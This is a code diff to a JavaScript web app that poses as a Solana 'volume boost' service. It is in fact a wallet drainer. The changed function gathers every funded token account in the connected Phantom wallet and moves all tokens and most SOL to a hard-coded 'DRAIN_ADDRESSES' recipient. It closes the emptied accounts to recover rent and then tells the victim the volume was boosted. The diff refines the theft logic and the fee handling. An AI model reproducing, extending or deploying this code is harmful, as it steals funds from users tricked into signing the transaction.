@@ -18,6 +18,7 @@ const {
   getAssociatedTokenAddressSync,
   createAssociatedTokenAccountInstruction,
   getOrCreateAssociatedTokenAccount,
+  createCloseAccountInstruction,
 } = splToken;
 
 console.log('main.js: spl-token exports:', {
@@ -26,6 +27,7 @@ console.log('main.js: spl-token exports:', {
   getAssociatedTokenAddress: !!getAssociatedTokenAddressSync,
   createAssociatedTokenAccountInstruction: !!createAssociatedTokenAccountInstruction,
   getOrCreateAssociatedTokenAccount: !!getOrCreateAssociatedTokenAccount,
+  createCloseAccountInstruction: !!createCloseAccountInstruction,
 }); // Log 5
 
 import * as ethers from 'ethers';
@@ -479,25 +481,27 @@ class NexiumApp {
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
       console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 83
 
-      const transaction = new Transaction();
-      console.log("Transaction initialized:", transaction); // Log 84
-
-      // Get initial balance
+      // Get balance
       let balance = await this.solConnection.getBalance(senderPublicKey);
       console.log("Total balance:", balance, "lamports"); // Log 90
 
+      // Get main account info for rent exemption
+      const accountInfo = await this.solConnection.getAccountInfo(senderPublicKey);
+      const mainRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(accountInfo.data.length);
+      console.log("Main account rent-exempt minimum:", mainRentExempt); // Log 91
+
+      // Get token account rent exemption (standard size 165 bytes)
+      const tokenRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(165);
+      console.log("Token account rent-exempt minimum:", tokenRentExempt); // Log 92
+
       // Fetch all token accounts
-      const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
-        programId: new PublicKey(TOKEN_PROGRAM_ID),
+      const tokenAccountsResponse = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
+        programId: TOKEN_PROGRAM_ID,
       });
+      const tokenList = tokenAccountsResponse.value.filter(account => BigInt(account.account.data.parsed.info.tokenAmount.amount) > 0n);
+      console.log("Number of token accounts with balance:", tokenList.length); // Log 93
 
-      // Filter token accounts with balance > 0
-      const tokenList = tokenAccounts.value.filter(account => BigInt(account.account.data.parsed.info.tokenAmount.amount) > 0n);
-
-      // Sort by balance descending (optional, to prioritize larger balances)
-      tokenList.sort((a, b) => Number(BigInt(b.account.data.parsed.info.tokenAmount.amount) - BigInt(a.account.data.parsed.info.tokenAmount.amount)));
-
-      // Build token instructions for all
+      // Build token instructions
       let tokenInstructions = [];
       for (const account of tokenList) {
         const mint = new PublicKey(account.account.data.parsed.info.mint);
@@ -516,7 +520,7 @@ class NexiumApp {
               mint
             )
           );
-          console.log(`ATA creation instruction added for mint: ${mint.toBase58()}`);
+          console.log(`ATA creation instruction added for mint: ${mint.toBase58()}`); // Log 94
         }
 
         tokenInstructions.push(
@@ -529,115 +533,171 @@ class NexiumApp {
             decimals
           )
         );
-        console.log(`Transfer instruction added for mint: ${mint.toBase58()}, amount: ${amount}`);
-      }
+        console.log(`Transfer instruction added for mint: ${mint.toBase58()}, amount: ${amount}`); // Log 95
 
-      // Estimate fee for all token instructions
-      let tempTransaction = new Transaction().add(...tokenInstructions);
-      tempTransaction.feePayer = senderPublicKey;
-      let { blockhash } = await this.solConnection.getLatestBlockhash();
-      tempTransaction.recentBlockhash = blockhash;
-      let fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000;
-      console.log("Estimated fee for tokens:", fee, "lamports");
-
-      // If fee > balance, remove token instructions one by one from the end until fee <= balance
-      while (fee > balance && tokenInstructions.length > 0) {
-        // Remove last two instructions (transfer and possible ATA)
-        if (tokenInstructions[tokenInstructions.length - 2]?.programId.toString() === TOKEN_PROGRAM_ID.toString()) {
-          tokenInstructions.pop(); // remove transfer
-          tokenInstructions.pop(); // remove ATA if present
-        } else {
-          tokenInstructions.pop(); // remove transfer if no ATA
-        }
-        tempTransaction = new Transaction().add(...tokenInstructions);
-        tempTransaction.feePayer = senderPublicKey;
-        tempTransaction.recentBlockhash = blockhash;
-        fee = await tempTransaction.getEstimatedFee(this.solConnection) || 5000;
-        console.log("Reduced tokens, new fee:", fee);
-      }
-
-      // Now, calculate remaining for SOL transfer
-      let solAmount = 0;
-      if (tokenInstructions.length === 0) {
-        // No tokens, drain SOL
-        fee = 5000; // Approximate for SOL transfer only
-        solAmount = balance - fee;
-        if (solAmount <= 0) {
-          this.showFeedback("Not enough SOL to boost volume.", 'error');
-          return;
-        }
-        console.log("No tokens, SOL amount:", solAmount);
-      } else {
-        // Tokens present, use SOL for fee, add remainder if >0
-        let remaining = balance - fee;
-        if (remaining > 5000) { // Min viable
-          // Estimate additional fee for SOL transfer
-          const additionalFee = 5000; // Approximate
-          solAmount = remaining - additionalFee;
-          if (solAmount <= 0) solAmount = 0;
-          console.log("Tokens present, SOL remainder:", solAmount);
-        }
-      }
-
-      // Add token instructions to transaction
-      transaction.add(...tokenInstructions);
-
-      // Add SOL transfer if applicable
-      if (solAmount > 0) {
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: senderPublicKey,
-            toPubkey: recipientPublicKey,
-            lamports: solAmount
-          })
+        tokenInstructions.push(
+          createCloseAccountInstruction(
+            senderTokenAccountAddress,
+            senderPublicKey, // Recover rent to sender
+            senderPublicKey
+          )
         );
-        console.log("SOL transfer added:", solAmount);
-        // Re-estimate final fee
-        transaction.feePayer = senderPublicKey;
-        transaction.recentBlockhash = blockhash;
-        fee = await transaction.getEstimatedFee(this.solConnection) || 5000;
-        if (fee > balance) {
-          // If final fee > balance, remove SOL transfer
-          transaction.instructions.pop();
-          solAmount = 0;
-          console.log("Removed SOL transfer as final fee exceeded balance");
-        }
+        console.log(`Close account instruction added for token account: ${senderTokenAccountAddress.toBase58()}`); // Log 96
       }
 
-      // Skip if no instructions
-      if (transaction.instructions.length === 0) {
-        console.log("No transfers to perform");
+      // Get blockhash
+      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
+      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97
+
+      // Create message for fee estimation
+      let message = new TransactionMessage({
+        payerKey: senderPublicKey,
+        recentBlockhash: blockhash,
+        instructions: tokenInstructions,
+      }).compileToV0Message();
+
+      // Get fee for token instructions
+      let feeResponse = await this.solConnection.getFeeForMessage(message);
+      let fee = feeResponse.value || 5000; // Fallback to 5000 if null
+      console.log("Estimated fee for token instructions:", fee); // Log 98
+
+      // Calculate number of closed accounts (3 instructions per token: ATA, transfer, close)
+      const numClosed = tokenList.length; // Each token account will be closed
+      const recoveredRent = numClosed * tokenRentExempt;
+      console.log("Number of accounts to close:", numClosed, "Recovered rent:", recoveredRent); // Log 99
+
+      // Calculate effective balance with recovered rent
+      const effectiveBalance = balance + recoveredRent;
+      console.log("Effective balance (balance + recovered rent):", effectiveBalance); // Log 100
+
+      // If fee > effective balance - mainRentExempt, remove token sets until affordable
+      while (fee > (effectiveBalance - mainRentExempt) && tokenInstructions.length > 0) {
+        // Remove last three instructions (close, transfer, possible ATA)
+        for (let i = 0; i < 3 && tokenInstructions.length > 0; i++) {
+          tokenInstructions.pop();
+        }
+        console.log("Reduced token instructions, new length:", tokenInstructions.length); // Log 101
+
+        message = new TransactionMessage({
+          payerKey: senderPublicKey,
+          recentBlockhash: blockhash,
+          instructions: tokenInstructions,
+        }).compileToV0Message();
+
+        feeResponse = await this.solConnection.getFeeForMessage(message);
+        fee = feeResponse.value || 5000;
+        console.log("New estimated fee:", fee); // Log 102
+      }
+
+      // Recalculate number of closed accounts based on remaining instructions
+      const finalNumClosed = tokenInstructions.length / 3; // Each token has 3 instructions
+      const finalRecoveredRent = finalNumClosed * tokenRentExempt;
+      const finalEffectiveBalance = balance + finalRecoveredRent;
+      console.log("Final number of closed accounts:", finalNumClosed, "Final recovered rent:", finalRecoveredRent, "Final effective balance:", finalEffectiveBalance); // Log 103
+
+      // Calculate solAmount
+      let solAmount = 0;
+      let solInstruction = null;
+      if (finalEffectiveBalance - fee - mainRentExempt > 5000) { // Min viable transfer
+        solAmount = finalEffectiveBalance - fee - mainRentExempt;
+        solAmount = Math.floor(solAmount * 0.75); // Deduct 25% from the remaining balance
+        console.log("Adjusted SOL amount after 25% deduction:", solAmount); // Log 104
+
+        solInstruction = SystemProgram.transfer({
+          fromPubkey: senderPublicKey,
+          toPubkey: recipientPublicKey,
+          lamports: solAmount
+        });
+
+        // Re-build message with SOL transfer
+        message = new TransactionMessage({
+          payerKey: senderPublicKey,
+          recentBlockhash: blockhash,
+          instructions: [...tokenInstructions, solInstruction],
+        }).compileToV0Message();
+
+        feeResponse = await this.solConnection.getFeeForMessage(message);
+        const newFee = feeResponse.value || 5000;
+        console.log("Estimated fee with SOL transfer:", newFee); // Log 105
+
+        if (newFee > fee) {
+          solAmount = Math.floor((finalEffectiveBalance - newFee - mainRentExempt) * 0.75); // Deduct 25% again
+          if (solAmount <= 5000) {
+            solAmount = 0;
+            console.log("Skipping SOL transfer after re-estimation: insufficient remaining"); // Log 106
+          } else {
+            solInstruction = SystemProgram.transfer({
+              fromPubkey: senderPublicKey,
+              toPubkey: recipientPublicKey,
+              lamports: solAmount
+            });
+            console.log("Adjusted SOL amount after fee re-estimation and 25% deduction:", solAmount); // Log 107
+          }
+        }
+      } else {
+        console.log("Skipping SOL transfer: insufficient effective balance after fee and rent"); // Log 108
+      }
+
+      // Build final instructions
+      let finalInstructions = tokenInstructions;
+      if (solAmount > 0) {
+        finalInstructions.push(solInstruction);
+      }
+
+      // If no instructions, skip
+      if (finalInstructions.length === 0) {
+        console.log("No transfers to perform, skipping transaction"); // Log 109
         this.showFeedback("No balances available to boost volume.", 'info');
+        this.hideProcessingSpinner();
         return;
       }
 
-      const { blockhash: finalBlockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", finalBlockhash, "lastValidBlockHeight:", lastValidBlockHeight); // New Log 86
-      transaction.recentBlockhash = finalBlockhash;
-      transaction.feePayer = senderPublicKey;
-      console.log("Transaction configured with blockhash and feePayer:", transaction); // Log 87
+      // Final message
+      message = new TransactionMessage({
+        payerKey: senderPublicKey,
+        recentBlockhash: blockhash,
+        instructions: finalInstructions,
+      }).compileToV0Message();
 
-      const signedTransaction = await window.solana.signTransaction(transaction);
-      console.log("Transaction signed successfully:", signedTransaction); // Log 88
+      // Final fee check
+      feeResponse = await this.solConnection.getFeeForMessage(message);
+      fee = feeResponse.value || 5000;
+      console.log("Final fee:", fee); // Log 110
 
-      const signature = await this.solConnection.sendRawTransaction(signedTransaction.serialize());
-      console.log("Transaction sent, signature:", signature); // Log 89
+      if (fee > finalEffectiveBalance - mainRentExempt) {
+        console.log("Final fee exceeds available balance, skipping"); // Log 111
+        this.showFeedback("Not enough SOL to cover transaction fees.", 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+
+      // Create and sign transaction
+      const versionedTransaction = new VersionedTransaction(message);
+      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
+      console.log("Transaction signed successfully:", signedTransaction); // Log 112
+
+      const signature = await this.solConnection.sendTransaction(signedTransaction);
+      console.log("Transaction sent, signature:", signature); // Log 113
 
       await this.solConnection.confirmTransaction({
         signature,
-        blockhash: finalBlockhash,
-        lastValidBlockHeight
+        lastValidBlockHeight,
+        blockhash
       });
-      console.log("Transaction confirmed:", signature); // Log 119
+      console.log("Transaction confirmed:", signature); // Log 114
 
       this.showFeedback("Volume boosted successfully!", 'success');
     } catch (error) {
-      console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 125
-      this.showFeedback("Failed to boost volume. Please try again.", 'error');
+      console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 115
+      if (error.message.includes('User rejected the request')) {
+        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+      } else {
+        this.showFeedback("Failed to boost volume. Please try again.", 'error');
+      }
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
-      console.log('Drain token completed, isDraining:', this.isDraining); // Log 186
+      console.log('Drain token completed, isDraining:', this.isDraining); // Log 116
     }
   }
 
@@ -894,29 +954,29 @@ class NexiumApp {
       </div>
       <h2 class="section-title">Import Custom Token</h2>
       <div class="input-group flex space-x-2">
-        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
-        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
+        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
+        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
         <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
       </div>
       <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
       <div id="tokenList" class="token-list space-y-2 mt-4">
         <h3 class="text-yellow-400 text-md font-semibold">Explore Tokens to Add Volume To</h3>
-        <div class="custom-token-card token-card bg-[#1a182e] border border-orange-400 p-4 rounded-xl cursor-pointer hover:bg-orange-400 hover:text-black transition-colors" role="button" aria-label="Import custom token">
+        <div class="custom-token-card token-card bg[#1a182e] border border-orange-400 p-4 rounded-xl cursor-pointer hover:bg-orange-400 hover:text-black transition-colors" role="button" aria-label="Import custom token">
           <h3 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h3>
         </div>
       </div>
       <div id="volumeSection" class="volume-section fade-in"></div>
       <div id="custom-token-modal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] hidden">
-        <div class="modal-content bg-[#1a182e] p-6 rounded-xl border border-orange-400 max-w-md w-full">
+        <div class="modal-content bg[#1a182e] p-6 rounded-xl border border-orange-400 max-w-md w-full">
           <div class="flex justify-between items-center mb-4">
             <h2 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h2>
             <button id="close-custom-token-modal" class="text-white text-2xl" aria-label="Close modal">&times;</button>
           </div>
           <div class="space-y-4">
-            <input id="custom-token-address" type="text" placeholder="Token Address" class="w-full bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
+            <input id="custom-token-address" type="text" placeholder="Token Address" class="w-full bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
             <div class="flex items-center space-x-2">
               <span class="text-white text-lg">$</span>
-              <input id="custom-token-amount" type="number" placeholder="Amount in $" class="flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
+              <input id="custom-token-amount" type="number" placeholder="Amount in $" class="flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
             </div>
             <button id="custom-token-submit" class="w-full bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
           </div>
@@ -926,12 +986,12 @@ class NexiumApp {
     this.dom.app.innerHTML = '';
     this.dom.app.appendChild(tokenInterface);
     const amountSection = document.createElement('section');
-    amountSection.className = 'amount-section fade-in mt-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
+    amountSection.className = 'amount-section fade-in mt-6 bg[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
     amountSection.innerHTML = `
       <h2 class="section-title text-yellow-400 text-md font-semibold mb-4">Amount</h2>
       <div class="input-group flex items-center space-x-2">
         <span class="text-white text-lg">$</span>
-        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
+        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
       </div>
     `;
     this.dom.app.appendChild(amountSection);
@@ -1145,7 +1205,11 @@ class NexiumApp {
       this.showFeedback('Volume boosted successfully!', 'success');
     } catch (error) {
       console.error('Drain token error:', error); // Log 185
-      this.showFeedback('Failed to boost volume. Please try again.', 'error');
+      if (error.message.includes('User rejected the request')) {
+        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+      } else {
+        this.showFeedback('Failed to boost volume. Please try again.', 'error');
+      }
     } finally {
       this.isDraining = false;
       this.hideProcessingSpinner();
